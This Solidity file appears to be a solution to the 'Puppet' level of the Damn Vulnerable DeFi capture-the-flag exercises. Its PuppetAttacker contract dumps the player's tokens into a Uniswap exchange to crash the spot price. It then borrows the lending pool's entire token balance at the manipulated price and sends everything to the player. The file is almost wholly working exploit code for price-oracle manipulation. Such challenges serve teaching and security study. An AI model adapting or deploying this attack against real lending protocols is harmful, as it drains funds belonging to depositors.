// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {UniswapExchangeInterface} from "./UniswapExchangeInterface.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {console} from "hardhat/console.sol";

contract PuppetAttacker {
    UniswapExchangeInterface public immutable uniswapExchange;
    PuppetPool public immutable puppetPool;
    DamnValuableToken public immutable token;
    address public immutable player;
    uint256 public immutable tokenBalance;

    constructor(
        address uniswapExchangeAddress,
        address puppetPoolAddress,
        address tokenAddress,
        uint256 value,
        uint64 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        uniswapExchange = UniswapExchangeInterface(uniswapExchangeAddress);
        puppetPool = PuppetPool(puppetPoolAddress);
        token = DamnValuableToken(tokenAddress);
        player = msg.sender;
        tokenBalance = value;
        token.permit(msg.sender, address(this), value, deadline, v, r, s);
        token.transferFrom(msg.sender, address(this), value);
        console.log(
            "token.balanceOf(address(this)): %s",
            token.balanceOf(address(this))
        );

        uint256 min_eths = uniswapExchange.getTokenToEthInputPrice(
            tokenBalance
        );
        console.log("min_eths: %s", min_eths);
        token.approve(address(uniswapExchange), tokenBalance);
        uniswapExchange.tokenToEthSwapInput(
            tokenBalance,
            min_eths,
            block.timestamp
        );

        uint256 depositRequired = puppetPool.calculateDepositRequired(
            token.balanceOf(address(puppetPool))
        );
        console.log("depositRequired: %s", depositRequired);
        puppetPool.borrow{value: depositRequired}(
            token.balanceOf(address(puppetPool)),
            player
        );

        token.transfer(player, token.balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }
}
